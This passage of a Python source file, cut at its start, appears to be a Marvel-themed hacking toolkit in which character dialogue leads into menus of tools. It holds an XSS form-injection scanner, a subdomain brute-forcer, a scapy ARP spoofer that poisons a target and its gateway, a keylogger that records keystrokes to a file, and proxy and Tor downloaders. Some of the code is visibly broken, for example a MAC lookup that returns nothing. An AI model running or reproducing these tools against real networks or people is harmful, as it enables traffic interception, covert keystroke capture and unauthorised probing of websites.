    timming(blue + "     ======== " + "Drax the Destroyer" + " ========\n")
    timming(
        green + "     There are two types of beings in the"
                "\n     universe. Those who dance, and those"
                "\n     who do not. I'm Drax the Destroyer!!!\n")
    input(blue + '     Please press enter to move forward ')


def sub_scanner():
    domain = str(input(green + "Input target domain :"))
    file = open("Subdomains.txt")
    DNS = file.read()
    subs = DNS.splitlines()

    for sub in subs:
        Link = f'http://{sub}.{domain}'

        try:
            requests.get(Link)
        except requests.ConnectionError:
            # print("Cntrl + c")
            pass
        else:
            print("Your target subdomain :-  ", Link)


def get_all_forms(url):
    """Given a `url`, it returns all forms from the HTML content"""
    soup = BeautifulSoup(requests.get(url).content, "html.parser")
    return soup.find_all("form")


def get_form_details(form):
    """
    This function extracts all possible useful information about an HTML `form`
    """
    details = {}
    # get the form action (target url)
    action = form.attrs.get("action").lower()
    # get the form method (POST, GET, etc.)
    method = form.attrs.get("method", "get").lower()
    # get all the input details such as type and name
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        inputs.append({"type": input_type, "name": input_name})
    # put everything to the resulting dictionary
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details


def submit_form(form_details, url, value):
    # construct the full URL (if the url provided in action is relative)
    target_url = urljoin(url, form_details["action"])
    print(target_url)
    # get the inputs
    inputs = form_details["inputs"]
    data = {}
    for input in inputs:
        # replace all text and search values with `value`
        if input["type"] == "text" or input["type"] == "search":
            input["value"] = value
        input_name = input.get("name")
        input_value = input.get("value")
        if input_name and input_value:
            # if input name and value are not None,
            # then add them to the data of form submission
            data[input_name] = input_value

    if form_details["method"] == "post":
        return requests.post(target_url, data=data)
    else:
        # GET request
        return requests.get(target_url, params=data)


def scan_xss(url):
    # get all the forms from the URL
    forms = get_all_forms(url)
    print(f"[+] Detected {len(forms)} forms on {url}.")
    js_script = "<Script>alert('hi')</scripT>"
    # returning value
    is_vulnerable = False
    # iterate over all forms
    for form in forms:
        form_details = get_form_details(form)
        try:
            content = submit_form(form_details, url, js_script).content.decode()
        except:
            pass
        if js_script in content:
            print(f"[+] XSS Detected on {url}")
            print(f"[*] Form details:")
            print(form_details)
            is_vulnerable = True
            # won't break because we want to print available vulnerable forms
    return is_vulnerable


def drax_main():
    os.system("clear")
    print(colored(figlet_format("    DRAX     SCANNER", font="slant", ), color='blue'))
    print(yellow + "  This is no respectable establishment."
                   "\n  What do you expect us to do while we"
                   "\n  wait?\n")
    print(green + "       [1] Subdomain Scanner\n       [2] XSS Vulnerability\n       [3] Next tool\n")
    option = input("       Enter the choice : ")

    if option == '1':
        os.system('clear')
        print(colored(figlet_format("    DRAX     SCANNER", font="slant", ), color='blue'))
        sub_scanner()
        input(red + "\nPress Enter to Main Menu!!!")
        os.system("clear")
        drax_main()

    elif option == '2':
        os.system('clear')
        print(colored(figlet_format("    DRAX     SCANNER", font="slant", ), color='blue'))
        url = input(green+"Enter the Url (Example http://www.google.com) :")

        try:
            print(scan_xss(url))
            print("")
            input(red + "\nPress Enter to Main Menu!!!")
            os.system("clear")
            drax_main()
        except:
            print("No xss vulnerabilities are found")
            input(red + "\nPress Enter to Main Menu!!!")
            os.system('clear')
            drax_main()

    elif option == '3':
        os.system('clear')
        after_drax()


    else:
        print("      KeyboardInterrupt... Press enter to restart!!!")
        drax_main()


def after_drax():
    os.system("clear")
    timming(green + "\n\n\n\n   Furi : So What's our next move?")
    input("")
    timming("   StarLord : Raccoon has an idea.")
    input("")
    timming("   Raccoon : We're moving out with my space-ship!!! Are you ready?")
    input("")
    os.system("clear")
    timming(
        "\n\n\n\n\n\n\n\n\n\n\t\t\t\t\t\t\t       The raccoon brought everyone back to their world!!! ")
    input("")
    os.system("clear")
    timming("\n\n\n\n   Captain America : Where were you been?")
    input("")
    timming("   Furi : I was a little busy. Did you come alone?")
    input("")
    timming("   Captain America : No! My friends are with me too. Meet Sam,Wanda and Scott.")
    input("")
    falcon_banner()
    falcon()


def falcon_banner():
    os.system("clear")
    timming(colored(figlet_format("  FALCON", font="slant", ), color='red'))
    timming(blue + "    ============= " + "Sam Wilson" + " =============\n")
    timming(
        green + "    The only thing bumming me is the fact\n    that I'm more of a soldier than a spy!\n    I'm Falcon (remembering : on your left\n    cap!!!)\n")
    input(blue + '    [ Please press enter to move forward ]')


def falcon():
    os.system("clear")
    print(colored(figlet_format("  RED WING", font="slant", ), color='red'))
    print(yellow + "    I just wanna make sure we consider all our options\n")
    print(
        green + "    [01]  HTTP Headers\n    [02]  DNS Grabber\n    [03]  Host DNS Grabber\n    [04]  Next Tool\n")
    try:
        mode = input('    Select a mode : ')  # asking for input to select

        if mode == '1':
            os.system("clear")
            print(colored(figlet_format("  RED WING", font="slant", ), color='red'))
            print(colored(("  HTTP Headers"), color="yellow"))  # banner sub tool
            site = input(green + "  Enter your web address : ")  # asking input
            loading()  # calling loading animation
            http = 'https://api.hackertarget.com/httpheaders/?q=' + site
            infodata = requests.get(http)  # collecting information from website
            os.system("clear")
            print(colored(figlet_format("RED WING", font="slant", ), color='red'))
            print(red + infodata.text)  # printing the result
            input(green + "\nPress enter to main menu!!!")
            falcon()


        elif mode == '2':
            os.system("clear")
            print(colored(figlet_format("  RED WING", font="slant", ), color='red'))
            print(colored(("  DNS Grabber"), color="yellow"))  # banner sub tool
            site = input(green + "  Enter your website or IP : ")
            loading()
            dnslook = 'https://api.hackertarget.com/dnslookup/?q=' + site
            infodata = requests.get(dnslook)
            os.system("clear")
            print(colored(figlet_format("RED WING", font="slant", ), color='red'))
            print(red + infodata.text)
            input(green + "\nPress enter to main menu!!!")
            falcon()


        elif mode == '3':
            os.system("clear")
            print(colored(figlet_format("  RED WING", font="slant", ), color='red'))
            print(colored(("  Host DNS Grabber"), color="yellow"))
            site = input(green + "  Enter your website or IP : ")
            loading()
            hostdns = 'https://api.hackertarget.com/mtr/?q=' + site
            os.system("clear")
            print(colored(figlet_format("RED WING", font="slant", ), color='red'))
            infodata = requests.get(hostdns)
            print(red + infodata.text)
            input(green + "\nPress enter to main menu!!!")
            falcon()


        elif mode == '4':
            wanda_dia()
            os.system('clear')
            witcher()


        else:
            input(red + "\n    KeyboardInterrupt!!! tiktak to restart!!!")
            falcon()
    except ValueError:
        input(red + "\n    KeyboardInterrupt!!! tiktak to restart!!!")
        timeout(1)
        falcon()





def wanda_dia():
    os.system("clear")
    timming(colored(pyfiglet.figlet_format(" WITCHER", font="slant", ), color='red'))
    timming(blue + "      =============  Wanda Maximoff  =============")
    print("")
    timming(
        green + "     There's nothing more horrifying than a miracle!"
                "\n     I'm Wanda Maximoff!!! And I can do ARP_Spoofing"
                "\n     for you guys!\n")
    input(blue + '     >>>> [ Please press enter to move forward ] ')


def witcher():
   # os.system("clear")
    print(colored(pyfiglet.figlet_format("      WITCHER\n ARP SPOOFER", font='slant'), color="blue"))
    print(
        yellow + "    You can't outrun destiny just because you're terrified of it."
                 "\n    'Destiny' is probably up here!!!\n")
    print(
        green + "\t\t\t[1] ALL Networks\n\t\t\t[2] Network status\n\t\t\t[3] ARP_Spoofer\n\t\t\t[4] Next Tool\n\t\t\t[0] Back")
    options = input("\n\t\t\tEnter your Choice : ")

    if options == '1':
        try:

            os.system("\nnetdiscover")
        except KeyboardInterrupt:
            print('interception')
        witcher()

    elif options == '2':
        os.system("\nifconfig")
        witcher()



    elif options == '3':

        targetIP = str(input("\n\nEnter the target IP : "))
        gatewayIP = str(input("Enter the gateway IP  : "))
        destinationmac = input("Enter the target MAC : ")
        sourceMAC = input("source MAC : ")

        def spoofer(targetIP, spoofIP):

            packet = scapy.ARP(op=2, pdst=targetIP, hwdst=destinationmac, psrc=spoofIP)
            scapy.send(packet, verbose=False)

        def getmac(destinationIP):
            pass

        def restore(destinationIP, attackerIP):

            packet = scapy.ARP(op=2, pdst=destinationIP, hwdst=getmac(destinationIP), psrc=attackerIP, hwsrc=sourceMAC)
            scapy.send(packet, count=4, verbose=False)

        packets = 0
        try:
            while True:
                spoofer(targetIP, gatewayIP)
                spoofer(gatewayIP, targetIP)
                print(red + "\r[+] Sent packets " + str(packets)),
                sys.stdout.flush()
                packets += 1
                time.sleep(2)
        except KeyboardInterrupt:
            print("\nInterrupted Spoofing found CTRL + C------------ Restoring to normal state..")

            restore(targetIP, gatewayIP)
            restore(gatewayIP, targetIP)
            os.system('clear')
            witcher()

        def spoofer(targetIP, spoofIP):
            destinationmac = getmac(targetIP)
            packet = scapy.ARP(op=2, pdst=targetIP, hwdst=destinationmac, hwsrc=spoofIP)
            scapy.send(packet, verbose=False)

        spoofer(targetIP, gatewayIP)
        spoofer(gatewayIP, targetIP)
    elif options == '4':
        ant_intro()
    elif options == '0':
        wanda_dia()
        witcher()
    else:
        os.system('clear')
        witcher()


def ant_intro():
    os.system("clear")
    timming(colored(figlet_format("   TINY SOLDIER", font="slant", ), color='red'))
    print(blue + "        ============================ " + "Ant Man" + " ============================\n")
    timeout(2)
    timming(
        green + "        My days of breaking into places and stealing shit are over!"
                "\n        Well you haven't heard of me,  Now you wouldn't have heard"
                "\n        of me... I am ANT-MAN!!!")
    print()
    print("")
    input(blue + '        >>>> [ Please press enter to move forward ] ')
    anas()


def anas():
    os.system("clear")
    print(colored(figlet_format("TINY LOGGER", font="slant", ), color='blue'))
    try:
        print(yellow + "         What do you want me to do 'Peanut'...")
        print("")
        print(green + "         [1] Please input 's' to key logging\n         [2] Please input 'm' to next option\n")
        enter = input("         Enter your option : ")
        print("")
        if enter == 's':

            for i in trange(100, desc='\033[31m'"        Key Logging"):
                timeout(0.1)
            logging.log.basicConfig(
                filename='keylog.txt',
                level=logging.log.DEBUG,
                format='%(asctime)s - %(message)s')

            def onPressed(key):
                logging.log.info(str(key))

            with Listener(on_press=onPressed) as ls:
                ls.join()


        elif enter == 'm':
            after_ant()

            def visit_prox():  # Function 1

                try:
                    prx_list = open('proxies.txt', 'r')
                    prx1 = prx_list.read()
                    prx = ast.literal_eval(prx1)

                except:
                    os.system("clear")
                    print(colored(pyfiglet.figlet_format("   WIZARD", font="slant"), color="red"))
                    print('There are no details present in proxy list')
                    main1()
                print('\n{:<8} {:<15} {:<17} {:<10} {:<10} {:<10}'.format('No.', 'Country', 'IP', 'Port', 'HTTP',
                                                                          'HTTPS'))
                for key, value in prx.items():
                    Country, IP, Port, HTTP, HTTPS = value
                    print('{:<8} {:<15} {:<17} {:<10} {:<10} {:<10}'.format(key, Country, IP, Port, HTTP, HTTPS))
                try:
                    sel_prox = int(input("\nselect any proxy from the list (default is '1'): "))
                    proxy = {'http': '%s:%s' % (prx[sel_prox][1], prx[sel_prox][2]),
                             'https': '%s:%s' % (prx[sel_prox][1], prx[sel_prox][2])}

                except:
                    proxy = {'http': '%s:%s' % (prx[1][1], prx[1][2]), 'https': '%s:%s' % (prx[1][1], prx[1][2])}
                    print(red + "\nChoose right option!!!")
                    input(red + "\nPress enter to resart!!!")
                    os.system("clear")
                    main1()
                url = input('\nEnter the target url (default is "https://httpbin.org/ip"): ')
                if not url:
                    try:
                        r = requests.get('https://httpbin.org/ip', proxies=proxy)
                        print('\n', r.json())

                    except:
                        print(red + '\nUnable to establish connection. Please check your proxy')
                        input("\nPress enter to restart!!!")
                        os.system("clear")
                    main1()
                else:
                    try:
                        r = requests.get(url, proxies=proxy)
                        print('\n', r.content)
                        input(red + "\nPress enter to restart!!!")
                        os.system("clear")
                        main1()


                    except:
                        print(red + '\nUnable to establish connection, Please check your proxy')
                        input("\nPress enter to restart!!!")
                        os.system("clear")
                        main1()

            def dow_prox():  # Function 2

                try:
                    prx_list = open('proxies.txt', 'r')
                    prx1 = prx_list.read()
                    prx = ast.literal_eval(prx1)
                except:
                    print(red + '\nThere are no details present in proxy list')
                    input("\nPress enter to resart!!!")
                    os.system("clear")
                    main1()
                print('\n{:<8} {:<15} {:<17} {:<10} {:<10} {:<10}'.format('No.', 'Country', 'IP', 'Port', 'HTTP',
                                                                          'HTTPS'))
                for key, value in prx.items():
                    Country, IP, Port, HTTP, HTTPS = value
                    print('{:<8} {:<15} {:<17} {:<10} {:<10} {:<10}'.format(key, Country, IP, Port, HTTP, HTTPS))
                try:
                    sel_prox = int(input("\nselect any proxy from the list (default is '1'): "))
                    proxy = {'http': '%s:%s' % (prx[sel_prox][1], prx[sel_prox][2]),
                             'https': '%s:%s' % (prx[sel_prox][1], prx[sel_prox][2])}
                except:
                    proxy = {'http': '%s:%s' % (prx[1][1], prx[1][2]), 'https': '%s:%s' % (prx[1][1], prx[1][2])}
                    print(red + "\nChoose right option!!!")
                    input(red + "\nPress enter to resart!!!")
                    os.system("clear")
                    main1()

                def is_downloadable(url):  # Does the url contain a downloadable resource
                    h = requests.head(url, allow_redirects=True, proxies=proxy)
                    header = h.headers
                    content_type = header.get('content-type')
                    if 'text' in content_type.lower():
                        return False
                    if 'html' in content_type.lower():
                        return False
                    return True

                def get_filename_from_cd(cd):  # Get filename from content-disposition

                    if not cd:
                        return None
                    f_name = re.findall('filename=(.+)', cd)
                    if len(f_name) == 0:
                        return None
                    return f_name[0]

                url = input('\nEnter the target url: ')
                if not url:
                    print('\nNo url specified. Exiting...')
                    main()
                else:
                    if is_downloadable(url):
                        if url.find('/'):
                            f_name = url.rsplit('/', 1)[1]

                        if not f_name:
                            try:
                                r = requests.get(url, allow_redirects=True, proxies=proxy)
                                f_name = get_filename_from_cd(r.headers.get('content-disposition'))
                                open(f_name, 'wb').write(r.content)
                                print(red + '\nFile downloaded. Check the current directory')
                                main1()
                            except:
                                print(red + '\nThe given proxy or your network has some connectivity issues.')
                                print('Try again after changing proxy or network.')
                                input("\nPress enter to resart!!!")
                                os.system("clear")
                                main1()
                        else:
                            try:
                                r = requests.get(url, allow_redirects=True, proxies=proxy)
                                open(f_name, 'wb').write(r.content)
                                print(red + '\nFile downloaded. Check the current directory')
                                input(red + "Press enter to restart!!!")
                                os.system("clear")
                                main1()
                            except:
                                print(red + '\nThe given proxy or your network has some connectivity issues.')
                                print('Try again after changing proxy or network.')
                                input("\nPress enter to resart!!!")
                                os.system("clear")
                                main1()

                    else:
                        print(red + '\nSorry can\'t download from the specified target or proxy has some has issues')
                        input("\nPress enter to resart!!!")
                        os.system("clear")
                        main1()

            def prx_edt():  # Function 3
                print(
                    green + " [1] View available proxy list\n [2] Add new proxy to the list\n [3] Remove a particular proxy from the list\n [4] Remove all available proxies\n [0] Go back")
                pr_ch = input('\n Enter your option number: ')

                if pr_ch == '1':  # viewing proxy list
                    try:
                        prx_list = open('proxies.txt', 'r')
                        prx1 = prx_list.read()
                        prx = ast.literal_eval(prx1)

                    except:
                        print(red + '\nThere are no details present in proxy list')
                        input("\nPress enter to go back!!!")
                        prx_edt()
                    print(green + '\n{:<8} {:<15} {:<17} {:<10} {:<10} {:<10}'.format('No.', 'Country', 'IP', 'Port',
                                                                                      'HTTP', 'HTTPS'))
                    for key, value in prx.items():
                        Country, IP, Port, HTTP, HTTPS = value
                        print('{:<8} {:<15} {:<17} {:<10} {:<10} {:<10}'.format(key, Country, IP, Port, HTTP, HTTPS))
                    prx_list.close()
                    input(red + "\npress enter to see the next option!!!")
                    os.system("clear")
                    print(colored(pyfiglet.figlet_format("WIZARD", font="slant"), color="red"))
                    prx_edt()

                elif pr_ch == '2':  # add new proxy
                    try:
                        prx_list = open('proxies.txt', 'r')
                        prx1 = prx_list.read()
                        prx = ast.literal_eval(prx1)
                        a = len(prx) + 1
                        prx_list.close()
                    except:
                        a = 1
                        prx = None
                    b = input('\n Enter the country name: ')
                    c = input(' Enter the IP address: ')
                    d = input(' Enter the Port No: ')
                    e = input(' Does it support HTTP (YES/NO): ')
                    f = input(' Does it support HTTPS (YES/NO): ')
                    updt = {a: [b, c, d, e, f]}
                    if prx != None:
                        prx.update(updt)
                    else:
                        prx = updt
                    prx_list = open('proxies.txt', 'w+')
                    prx_list.write(str(prx))
                    prx_list.close()
                    prx_list = open('proxies.txt', 'r')
                    prx1 = prx_list.read()
                    prx = ast.literal_eval(prx1)
                    print('\n{:<8} {:<15} {:<17} {:<10} {:<10} {:<10}'.format('No.', 'Country', 'IP', 'Port', 'HTTP',
                                                                              'HTTPS'))
                    for key, value in prx.items():
                        Country, IP, Port, HTTP, HTTPS = value
                        print('{:<8} {:<15} {:<17} {:<10} {:<10} {:<10}'.format(key, Country, IP, Port, HTTP, HTTPS))

                    print(red + '\n New proxy added to list')
                    prx_list.close()
                    input("\n Press enter to go back!!!")
                    os.system("clear")
                    print(colored(pyfiglet.figlet_format("WIZARD", font="slant"), color="red"))
                    prx_edt()

                elif pr_ch == '3':  # remove a particular proxy
                    try:
                        prx_list = open('proxies.txt', 'r')
                        prx1 = prx_list.read()
                        prx = ast.literal_eval(prx1)
                    except:
                        print(red + '\nThere are no details present in proxy list')
                        input("\nPress enter to go back!!!")
                        prx_edt()
                    print('\n{:<8} {:<15} {:<17} {:<10} {:<10} {:<10}'.format('No.', 'Country', 'IP', 'Port', 'HTTP',
                                                                              'HTTPS'))
                    for key, value in prx.items():
                        Country, IP, Port, HTTP, HTTPS = value
                        print('{:<8} {:<15} {:<17} {:<10} {:<10} {:<10}'.format(key, Country, IP, Port, HTTP, HTTPS))
                    to_rm = int(input('\n\n Enter the number of the row: '))
                    del prx[to_rm]
                    prx_list = open('proxies.txt', 'w+')
                    prx_list.write(str(prx))
                    prx_list.close()
                    print(red + 'Deleted')
                    input("\nPress enter to go back!!!")
                    os.system("clear")
                    print(colored(pyfiglet.figlet_format("WIZARD", font="slant"), color="red"))
                    prx_edt()

                elif pr_ch == '4':  # remove all proxies
                    try:
                        prx_list = open('proxies.txt', 'r')
                        prx1 = prx_list.read()
                        prx = ast.literal_eval(prx1)
                    except:
                        print(red + '\n There are no details present in proxy list')
                        input(" Press enter to go back!!!")
                        os.system("clear")
                        prx_edt()
                    prx.clear()
                    prx = ''
                    prx_list = open('proxies.txt', 'w+')
                    prx_list.write(str(prx))
                    prx_list.close()
                    print(red + '\n Removed all proxies from proxy list')
                    prx_list.close()
                    input(" Press enter to go back!!!")
                    os.system("clear")
                    print(colored(pyfiglet.figlet_format("WIZARD", font="slant"), color="red"))
                    prx_edt()

                elif pr_ch == '0':
                    main1()
                else:
                    os.system("clear")
                    print(colored(pyfiglet.figlet_format("WIZARD", font="slant"), color="red"))
                    prx_edt()

            def tor_req():  # Function 4

                os.system('service tor start')
                z = os.system('service tor status | grep dead')
                if z == '0':
                    print('Sorry Tor service unable to start. Exiting...')
                    main()
                else:
                    proxies = {
                        'http': 'socks5://127.0.0.1:9050',
                        'https': 'socks5://127.0.0.1:9050'
                    }

                    url = input(green + '\n Enter the target url (default is "https://httpbin.org/ip"): ')
                    if not url:
                        try:
                            r = requests.get('https://httpbin.org/ip', proxies=proxies)
                            print('\n', r.json())

                        except:
                            print(red + '\n    Unable to establish connection. Please check Network connectivity')
                    else:
                        try:
                            r = requests.get(url, proxies=proxies)
                            print('\n', r.content)
                            input(red + "\n Press enter to go back!!!")
                            os.system("clear")
                            print(colored(pyfiglet.figlet_format("WIZARD", font="slant"), color="red"))
                            main1()
                        except:
                            print(red + '\n Unable to establish connection, Please check your Network connectivity')
                            input(red + " Press enter to go back!!!")
                            os.system("clear")
                            print(colored(pyfiglet.figlet_format("WIZARD", font="slant"), color="red"))
                            main1()

            def dow_tor():  # Function 6

                os.system('service tor start')
                z = os.system('service tor status | grep dead')
                if z == '0':
                    print('Sorry Tor service unable to start. Exiting...')
                    main()
                else:
                    proxies = {
                        'http': 'socks5://127.0.0.1:9050',
                        'https': 'socks5://127.0.0.1:9050'
                    }

                def is_downloadable(url):  # Does the url contain a downloadable resource
                    h = requests.head(url, allow_redirects=True, proxies=proxies)
                    header = h.headers
                    content_type = header.get('content-type')
                    if 'text' in content_type.lower():
                        return False
                    if 'html' in content_type.lower():
                        return False
                    return True

                def get_filename_from_cd(cd):  # Get filename from content-disposition

                    if not cd:
                        return None
                    f_name = re.findall('filename=(.+)', cd)
                    if len(f_name) == 0:
                        return None
                    return f_name[0]

                url = input(green + '  Enter the target url: ')
                if not url:
                    print(red + '\n  No url specified. Exiting...')
                    input("  Press enter to go back!!!")
                    os.system("clear")
                    print(colored(pyfiglet.figlet_format("WIZARD", font="slant"), color="red"))
                    dow_tor()
                else:
                    if is_downloadable(url):
                        if url.find('/'):
                            f_name = url.rsplit('/', 1)[1]

                        if not f_name:
                            try:
                                r = requests.get(url, allow_redirects=True, proxies=proxies)
                                f_name = get_filename_from_cd(r.headers.get('content-disposition'))
                                open(f_name, 'wb').write(r.content)
                                print(red + '\n  File downloaded. Check the current directory')
                                input("  Press enter to go back!!!")
                                os.system("clear")
                                print(colored(pyfiglet.figlet_format("WIZARD", font="slant"), color="red"))
                                main1()

                            except:
                                print(red + '\n  The given proxy or your network has some connectivity issues.')
                                print('  Try again after changing proxy or network.')


                        else:
                            try:
                                r = requests.get(url, allow_redirects=True, proxies=proxies)
                                open(f_name, 'wb').write(r.content)
                                print(red + '\n  File downloaded. Check the current directory')
                                input("  Press enter to go back!!!")
                                os.system("clear")
                                print(colored(pyfiglet.figlet_format("WIZARD", font="slant"), color="red"))
                                main1()
                            except:
                                print(red + '\n  The given proxy or your network has some connectivity issues.')
                                print('  Try again after changing proxy or network.')
                            dow_tor()




                    else:
                        print(red + "\n  Sorry can't download from the specified target or proxy has some has issues")

            def res_all():  # Function 7
                os.system('sudo service tor stop')
                print(green + ' All network changes made by Wizard has been discarded')
                input(red + " Press enter to go back!!!")
                os.system("clear")
                print(colored(pyfiglet.figlet_format(" WIZARD", font="slant"), color="red"))
                main1()

            while True:

                def main():
                    print(colored(pyfiglet.figlet_format(" WIZARD", font="slant"), color="red"))
                    timming(blue + "     =============== " + "Dr Strange" + " ===============\n")
                    print(
                        green + "     It explores the concept of life and death,"
                                "\n     time, space, and multiple universes which"
                                "\n     are visible!!!"
                                "\n     My name is Doctor Stephen Strange and I "
                                "\n     sense a great change in your future!!!\n")
                    input(blue + '     [ Please press enter to move forward ]')
                    os.system("clear")

                def main1():
                    main()
                    os.system("clear")
                    print(colored(pyfiglet.figlet_format(" WIZARD", font="slant"), color="red"))
                    print(
                        yellow + "     NOTE: For the smoother running of Wizard,"
                                 "\n     please install tor and other libraries in"
                                 "\n     requirements.txt\n")
                    print(
                        green + "    [1] View target page using proxy\n    [2] Download a file using proxy\n    [3] Edit proxy list\n    [4] View target page using tor\n    [5] Download a file using tor network \n    [6] Reset all network configurations made through Wizard \n    [7] Next Tool\n    [0] Exit Wizard")

                    opt = input(blue + '\n    Enter the option number: ')

                    if opt == '1':
                        os.system("clear")
                        print(colored(pyfiglet.figlet_format("   WIZARD", font="slant"), color="red"))
                        visit_prox()

                    elif opt == '2':
                        os.system("clear")
                        print(colored(pyfiglet.figlet_format("   WIZARD", font="slant"), color="red"))
                        dow_prox()

                    elif opt == '3':
                        os.system("clear")
                        print(colored(pyfiglet.figlet_format("WIZARD", font="slant"), color="red"))
                        prx_edt()

                    elif opt == '4':
                        os.system("clear")
                        print(colored(pyfiglet.figlet_format("   WIZARD", font="slant"), color="red"))
                        tor_req()

                    elif opt == '5':
                        os.system("clear")
                        print(colored(pyfiglet.figlet_format(" WIZARD", font="slant"), color="red"))
                        dow_tor()

                    elif opt == '6':
                        os.system("clear")
                        print(colored(pyfiglet.figlet_format(" WIZARD", font="slant"), color="red"))
                        res_all()
                    elif opt == '7':
                        os.system("clear")
                        after_strange()
                        wong_banner()
                        wong()
                        quit()
                    elif opt == '0':
                        exit()

                    else:
                        input(red + '\n    KeyboardInterrupt!!! press enter to restart!!!')
                        os.system('clear')
                        main1()

                main1()


        else:
            print("")
            print()
            input(red + "        oh,boy! KeyboardInterrupt... Tik Tak enter log again!!!")
            anas()
    except KeyboardInterrupt:
        print("")
        print()
        input(red + "        oh,boy! KeyboardInterrupt... Tik Tak enter log again!!!")
        anas()


def after_ant():
    os.system("clear")
    timming(
        green + "\n\n\n\n   Furi : Wokay!!! Nice to meet you all!!! It's confusing!!! Why still Dr.Strange didn't report.")
    input("")
    timming("   Dr.Strange : You need to keep both eyes open Mr.Furi!!!")
    input("")
    os.system("clear")


def after_strange():
    os.system("clear")
    timming(green + "\n\n\n\n   Dr.Strange : Here is my Sidekick.")
    input("")
    os.system("clear")


def wong_banner():
    os.system("clear")
    timming(colored(figlet_format("  SIDEKICK", font="slant", ), color='red'))
    timming(blue + "     =============== " + "Benedict Wong" + " ===============\n")
    timming(
        green + "     Wise choice!!!"
                "\n     You'll wear the Eye of Agamotto..."
                "\n     once you've mastered its powers!!!"
                "\n     I'm Wong, the sidekick of Dr.Strange!!!\n")
    input(blue + '     Please press enter to move forward ')


def wong():
    os.system("clear")
    print(colored(figlet_format("  SIDEKICK PDF ", font="slant", ), color='red'))
    print(yellow + "       Attachment to the material is detachment from the spiritual!"
                   "\n       What, you wanted more?")
    option = input(green +
                   "\n       [1] Encrypting PDF "
                   "\n       [2] Decrypting PDF\n       [3] Next Tool\n"
                   "\n       Enter your choice : ")

    if option == "1":
        os.system("clear")
        print(colored(figlet_format("    SIDEKICK   ENCRYPTION", font="slant", ), color='blue'))
        out = PdfFileWriter()
        myfile = input(green+"Select your PDF File: ")
        try:
            if os.path.isfile(myfile):
                file = PdfFileReader(myfile)
                num = file.numPages
                for idx in range(num):
                    page = file.getPage(idx)
                    out.addPage(page)
                pwd = input(green+"Set password: ")
                password = pwd
                out.encrypt(password)
                with open("encrypted.pdf", "wb") as f:
                    out.write(f)
                    loading()
                    print("\n=========================")
                    print("Saved as encrypted.pdf!!!")
                    print("=========================\n")
                    input(red + "Press enter to main menu!!!")
                    wong()
        except:
            print(red + "\n    KeyboardInterrupt!!! Press enter to restart!!! ")
        input("\nKeyboardInterrupt!!! Press enter to restart!!! ")
        wong()



    elif option == "2":
        os.system("clear")
        print(colored(figlet_format("    SIDEKICK   DECRYPTION", font="slant", ), color='blue'))
        out = PdfFileWriter()
        myfile = input(green+"Select your PDF File: ")
        try:
            if os.path.isfile(myfile):
                file = PdfFileReader(myfile)
                pwd = input("Set password: ")
                password = pwd
                if file.isEncrypted:
                    file.decrypt(password)
                    for idx in range(file.numPages):
                        page = file.getPage(idx)
                        out.addPage(page)
                        with open("decrypted.pdf", "wb") as f:
                            out.write(f)
                            loading()
                            print("\n=========================")
                            print("Saved as decrypted.pdf")
                            print(green + "=========================\n")
                            input(red + "Press enter to main menu!!!")
                            wong()
            else:
                input(red + "\nKeyboardInterrupt!!! Press enter to restart!!! ")
                wong()


        except:
            print("\n")
            # richard()

    elif option == '3':
        os.system("")
        after_wong()
        credits()
        input("")
        end()
        input("")
    else:
        input(red + "\n       KeyboardInterrupt!!! Press enter to restart!!!")
        wong()


def after_wong():
    os.system("clear")
    timming("\n\n\n\n   Furi : Level 9 completed!!! All heroes stay low!!! Wait for my call!!!")
    input("")
    timming("   Tony Stark : We need to be vigilant about the next attack.")
    input("")
    os.system('clear')
    timming("\n\n\n\n\n\n\n\n\n\t\t\t\t\t\t\t\t     Lets show them what we got!!! ")
    input("")


loki_intro()
